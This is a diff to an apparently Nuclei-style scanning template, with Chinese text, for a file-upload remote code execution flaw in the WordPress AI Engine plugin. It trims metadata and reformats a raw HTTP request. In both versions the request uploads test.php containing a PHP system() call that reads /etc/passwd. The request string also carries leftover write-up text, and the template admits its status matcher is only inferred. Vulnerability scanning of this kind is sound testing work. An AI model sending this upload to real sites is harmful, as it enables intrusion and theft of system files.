@@ -3,16 +3,11 @@ info:
   name: WordPress AI Engine插件文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lx8rxrvr7numrd39
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lx8rxrvr7numrd39
 http:
 - raw:
-  - "POST /wp-json/mwai-ui/v1/files/upload HTTP/1.1\n\nHost: {{Hostname}}\n\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\n\nAccept: */*\n\nContent-Disposition: form-data; filename=\"test.txt\"\n\nContent-Type: multipart/form-data; boundary=------------------------8ecd2b831e8d20f4\n\nConnection: close\n\n\n\n--------------------------8ecd2b831e8d20f4\n\nContent-Disposition: form-data; name=\"file\"; filename=\"test.php\"\n\nContent-Type: text/plain\n\n\n\n<?php system(\"cat /etc/passwd\");?>\n\n--------------------------8ecd2b831e8d20f4--\n\n![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717057403100-d626a581-89a1-4fe4-a1e7-82d4f137e102.png)\n\n验证\n\n![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717057403392-1b13787b-111d-4fe2-88db-ad43bbae1157.png)\n\n\n\n### 修复建议\n1、请联系厂商进行修复。\n\n 2、如非必要，禁止公网访问该系统。\n\n 3、设置白名单访问。"
+  - "POST /wp-json/mwai-ui/v1/files/upload HTTP/1.1\n\nHost: {{Hostname}}\n\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\n\nAccept: */*\n\nContent-Disposition: form-data; filename=\"test.txt\"\n\nContent-Type: multipart/form-data; boundary=------------------------8ecd2b831e8d20f4\n\nConnection: close\n\n--------------------------8ecd2b831e8d20f4\n\nContent-Disposition: form-data; name=\"file\"; filename=\"test.php\"\n\nContent-Type: text/plain\n\n<?php system(\"cat /etc/passwd\");?>\n\n--------------------------8ecd2b831e8d20f4--\n\n验证\n\n### 修复建议\n1、请联系厂商进行修复。\n\n 2、如非必要，禁止公网访问该系统。\n\n 3、设置白名单访问。"
   redirects: false
   matchers:
   - status:
